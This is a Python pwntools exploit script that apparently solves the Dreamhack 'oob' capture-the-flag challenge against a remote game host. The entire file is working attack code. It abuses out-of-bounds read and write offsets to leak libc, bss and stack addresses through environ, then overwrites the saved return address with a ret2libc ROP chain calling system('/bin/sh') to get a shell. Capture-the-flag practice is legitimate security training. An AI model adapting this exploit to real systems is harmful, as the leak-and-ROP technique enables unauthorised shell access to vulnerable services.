#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'oob_patched'
HOST = 'host8.dreamhack.games'
PORT = 13012

exe = ELF(exe_path, checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x127c
brva 0x132d
c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# ============================EXPLOIT============================

# leak rip (libc) bytes to bytes, start with offset 16
leak = b''

for i in range(16, 22):
    sla(b'> ', b'1')
    sla(b'offset: ', str(i).encode())
    leak += p.recvuntil(b'\n', drop=True)

libc_leak = u64(leak.ljust(8, b'\x00'))
libc.address = libc_leak - 0x21a780
log.info(f'libc leak: {hex(libc_leak)}')
log.info(f'libc base: {hex(libc.address)}')

# leak bss bytes to bytes, offset -6 to 0
leak = b''
for i in range(-7, 0):
    sla(b'> ', b'1')
    sla(b'offset: ', str(i).encode())
    leak += p.recvuntil(b'\n', drop=True)
leak = b'\x00' + leak
bss_leak = u64(leak.ljust(8, b'\x00'))
log.info(f'bss leak: {hex(bss_leak)}')

sys = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
pop_rdi = libc.address + 0x000000000002a3e5
ret = 0x0000000000029cd6 + libc.address
log.info(f'system: {hex(sys)}')
log.info(f'/bin/sh: {hex(binsh)}')
log.info(f'pop rdi; ret: {hex(pop_rdi)}')
log.info(f'ret: {hex(ret)}')

# leak stack via environ
environ = libc.symbols['environ']
log.info(f'environ: {hex(environ)}')
leak = b''
offset = (environ - bss_leak-0x10)
for i in range(offset, offset + 8):
    sla(b'> ', b'1')
    sla(b'offset: ', str(i).encode())
    leak += p.recvuntil(b'\n', drop=True)
stack_leak = u64(leak.ljust(8, b'\x00'))
saved_rbp = stack_leak - 0x128
log.info(f'stack leak: {hex(stack_leak)}')
log.info(f'saved rbp: {hex(saved_rbp)}')

# overwrite saved rip with ROP
log.info(f'overwriting saved rip with: {hex(pop_rdi)}')
offset = saved_rbp - (bss_leak+0x10) + 8
for i in range(offset, offset + 8):
    sla(b'> ', b'2')
    sla(b'offset: ', str(i).encode())
    sla(b'value: ', str((pop_rdi >> ((i - offset) * 8)) & 0xff).encode())
for i in range(offset + 8, offset + 16):
    sla(b'> ', b'2')
    sla(b'offset: ', str(i).encode())
    sla(b'value: ', str((binsh >> ((i - offset - 8) * 8)) & 0xff).encode())
for i in range(offset + 16, offset + 24):
    sla(b'> ', b'2')
    sla(b'offset: ', str(i).encode())
    sla(b'value: ', str((ret >> ((i - offset - 16) * 8)) & 0xff).encode())
for i in range(offset + 24, offset + 32):
    sla(b'> ', b'2')
    sla(b'offset: ', str(i).encode())
    sla(b'value: ', str((sys >> ((i - offset - 24) * 8)) & 0xff).encode())
sla(b'> ', b'3')
p.interactive()
